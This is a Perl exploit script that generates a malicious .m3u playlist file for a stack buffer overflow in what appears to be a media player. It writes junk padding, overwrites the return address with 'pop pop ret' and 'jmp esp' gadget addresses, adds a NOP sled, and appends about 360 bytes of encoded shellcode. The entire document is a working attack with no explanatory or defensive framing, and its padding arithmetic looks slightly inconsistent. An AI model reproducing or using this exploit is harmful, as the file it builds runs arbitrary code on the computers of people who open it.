my $file= "test1.m3u";
my $junk="\x41" x 26081;
my $eip= pack('V', 0x1002d619); # pop pop ret
my $jmpesp=pack('V', 0x7e45b310); # jmp esp
my $prependesp = "XX";
my $shellcode = "\x90" x 8;
my $padding = "\x90" x 30;
$shellcode = $shellcode . $jmpesp . $padding;
# 360
$shellcode = $shellcode .
"\xbb\xa4\x45\xe1\x13\xd9\xf7\xd9\x74\x24\xf4\x5a\x2b\xc9" .
"\xb1\x54\x83\xc2\x04\x31\x5a\x0f\x03\x5a\xab\xa7\x14\xef" .
"\x5b\xa5\xd7\x10\x9b\xca\x5e\xf5\xaa\xca\x05\x7d\x9c\xfa" .
"\x4e\xd3\x10\x70\x02\xc0\xa3\xf4\x8b\xe7\x04\xb2\xed\xc6" .
"\x95\xef\xce\x49\x15\xf2\x02\xaa\x24\x3d\x57\xab\x61\x20" .
"\x9a\xf9\x3a\x2e\x09\xee\x4f\x7a\x92\x85\x03\x6a\x92\x7a" .
"\xd3\x8d\xb3\x2c\x68\xd4\x13\xce\xbd\x6c\x1a\xc8\xa2\x49" .
"\xd4\x63\x10\x25\xe7\xa5\x69\xc6\x44\x88\x46\x35\x94\xcc" .
"\x60\xa6\xe3\x24\x93\x5b\xf4\xf2\xee\x87\x71\xe1\x48\x43" .
"\x21\xcd\x69\x80\xb4\x86\x65\x6d\xb2\xc1\x69\x70\x17\x7a" .
"\x95\xf9\x96\xad\x1c\xb9\xbc\x69\x45\x19\xdc\x28\x23\xcc" .
"\xe1\x2b\x8c\xb1\x47\x27\x20\xa5\xf5\x6a\x2c\x0a\x34\x95" .
"\xac\x04\x4f\xe6\x9e\x8b\xfb\x60\x92\x44\x22\x76\xd5\x7e" .
"\x92\xe8\x28\x81\xe3\x21\xee\xd5\xb3\x59\xc7\x55\x58\x9a" .
"\xe8\x83\xf5\x9f\x7e\xec\xa2\xc3\x19\x84\xb0\x03\xf4\x08" .
"\x3c\xe5\xa6\xe0\x6e\xba\x06\x51\xcf\x6a\xee\xbb\xc0\x55" .
"\x0e\xc4\x0a\xfe\xa4\x2b\xe3\x56\x50\xd5\xae\x2d\xc1\x1a" .
"\x65\x48\xc1\x91\x8c\xac\x8f\x51\xe4\xbe\xe7\x03\x06\x3f" .
"\xf7\xa9\x06\x55\xf3\x7b\x50\xc1\xf9\x5a\x96\x4e\x02\x89" .
"\xa4\x89\xfc\x4c\x9d\xe2\xca\xda\xa1\x9c\x32\x0b\x22\x5d" .
"\x64\x41\x22\x35\xd0\x31\x71\x20\x1f\xec\xe5\xf9\xb5\x0f" .
"\x5c\xad\x1e\x78\x62\x88\x68\x27\x9d\xff\xeb\x20\x61\x7d" .
"\xc9\x88\x0a\x7d\x4d\x29\xcb\x17\x4d\x79\xa3\xec\x62\x76" .
"\x03\x0c\xa9\xdf\x0b\x87\x3f\xad\xaa\x98\x6a\x73\x73\x98" .
"\x98\xa8\x62\x17\x5f\x4f\x8b\xd9\x5c\x99\xb2\xaf\xa5\x19" .
"\x81\xa0\x9c\x3c\xa0\x2a\xde\x13\xb2\x7e";

open($FILE, ">$file");
my $data = "$junk.$eip.$prependesp.$shellcode" . "\x41" x (30000 - 26801 - 4 - 2 - 8 - 4 - 30 - 360);
print $FILE $data;
close($FILE);
print "m3u File Created successfully\n";
